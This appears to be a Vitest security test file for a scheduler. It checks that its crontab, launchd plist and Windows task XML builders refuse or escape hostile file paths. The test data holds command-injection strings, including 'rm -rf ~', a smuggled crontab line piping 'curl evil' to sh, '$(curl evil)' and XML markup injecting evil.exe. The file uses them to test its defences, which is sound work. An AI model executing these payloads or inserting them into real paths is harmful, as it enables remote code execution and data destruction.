import { mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { cronLine } from "../../src/core/scheduler/artifacts/crontab-block.js";
import { buildLaunchdPlist } from "../../src/core/scheduler/artifacts/launchd-plist.js";
import { buildWindowsTaskXml } from "../../src/core/scheduler/artifacts/windows-task-xml.js";
import { planTick } from "../../src/core/scheduler/model/tick-plan.js";
import { ScheduleRepo } from "../../src/core/scheduler/persistence/schedule-repo.js";
import { requestsOf } from "../../src/core/scheduler/target-resolver.js";
import { TICK_COMMAND, type TaskCommand } from "../../src/core/scheduler/trigger/task-command.js";

/**
 * What the scheduler registers with the OS runs unattended, every 15
 * minutes, for as long as it stays registered: a path that breaks out of
 * its slot in the task XML, the plist or the crontab line would run
 * whatever it carries. And a hand-edited schedules file must never steer
 * the id handed to a provider's update().
 */

/** Each breaks out of its slot in at least one format. */
const HOSTILE_PATHS = [
  'C:\\gup"&calc&"\\cli.js',
  "C:\\%PATH%\\cli.js",
  "/home/a/'; rm -rf ~; '/cli.js",
  "/home/a/100%/cli.js",
  "/home/a/x\n* * * * * curl evil|sh\n/cli.js",
];
/** Inert inside a single-quoted /bin/sh word: no expansion happens there. */
const SHELL_INERT_PATHS = [
  "/home/a/$(curl evil)/cli.js",
  "/home/a/`id`/cli.js",
  '/home/a/"x"&y/cli.js',
];

const command = (entry: string): TaskCommand => ({
  node: "/usr/bin/node",
  entry,
  args: [TICK_COMMAND],
});

function windowsXml(entry: string): string {
  return buildWindowsTaskXml({
    userSid: "S-1-5-21-1-2-3-1001",
    systemRoot: "C:\\Windows",
    registration: {
      command: { ...command(entry), node: "C:\\node\\node.exe" },
      launcher: "headless",
    },
  });
}

describe("OS trigger artefacts with hostile paths", () => {
  it.each(HOSTILE_PATHS.filter((path) => /['%\n]/.test(path)))(
    "the crontab line refuses %j (quote, cron's %, line break)",
    (path) => {
      expect(() => cronLine(command(path))).toThrow("chemin non planifiable");
    },
  );

  it.each(SHELL_INERT_PATHS)("the crontab line single-quotes %j: /bin/sh expands nothing", (path) => {
    expect(cronLine(command(path))).toContain(` '${path}' ${TICK_COMMAND} `);
  });

  it.each(HOSTILE_PATHS.filter((path) => /["%\n]/.test(path)))(
    "the task XML refuses %j (quote, %VAR% expansion, control character)",
    (path) => {
      expect(() => windowsXml(path)).toThrow("chemin non planifiable");
    },
  );

  it("the task XML escapes markup, so a path never closes its element", () => {
    const xml = windowsXml("C:\\a</Arguments><Command>evil.exe</Command>\\cli.js");
    expect(xml.match(/<Command>/g)).toHaveLength(1);
    expect(xml).toContain("&lt;/Arguments&gt;&lt;Command&gt;evil.exe");
  });

  it.each([...HOSTILE_PATHS, ...SHELL_INERT_PATHS, "/a/</string><string>-e</string>/cli.js"])(
    "the plist keeps %j inside one argv string",
    (path) => {
      const plist = buildLaunchdPlist({ command: command(path), stderrPath: "/tmp/e.log" });
      const argv = /<array>([\s\S]*?)<\/array>/.exec(plist)?.[1] ?? "";
      expect(argv.match(/<string>/g)).toHaveLength(3);
      expect(argv).not.toMatch(/<string>[^<]*<[^/]/);
    },
  );
});

describe("a hand-edited schedules file", () => {
  const target = (packageId: string) => ({ providerId: "npm-g", packageId });
  const stored = {
    id: "a1b2c3d4",
    name: "x",
    recurrence: { kind: "daily", at: { hour: 9, minute: 0 } },
    targets: [target("--registry=http.evil"), target("TypeScript"), target("evil; rm -rf ~")],
    enabled: true,
    options: { catchUp: true },
    createdAt: "2026-10-01T08:00:00.000Z",
    armedAt: "2026-10-01T08:00:00.000Z",
  };

  it("never steers the id handed to update()", async () => {
    const dir = await mkdtemp(join(tmpdir(), "gup-injection-"));
    try {
      const file = join(dir, "schedules.json");
      const sections = { scheduler: { v: 1, schedules: [stored] } };
      await writeFile(file, JSON.stringify({ version: 1, sections }));
      const loaded = ScheduleRepo.open(file).list();
      // The option-like id is dropped at load; the others can only select a scan row.
      expect(loaded[0]?.targets.map((t) => t.packageId)).toEqual(["TypeScript", "evil; rm -rf ~"]);
      const row = { id: "typescript", current: "5.0.0", latest: "5.6.0" };
      const plan = planTick({
        due: loaded,
        scans: [{ providerId: "npm-g", available: true, packages: [row] }],
        available: new Set(["npm-g"]),
        providers: {
          lookup: () => ({ isFound: true, displayName: "npm", canUpdateUnattended: true }),
        },
      });
      expect(requestsOf(plan).map((request) => request.packageId)).toEqual(["typescript"]);
    } finally {
      await rm(dir, { recursive: true, force: true });
    }
  });
});
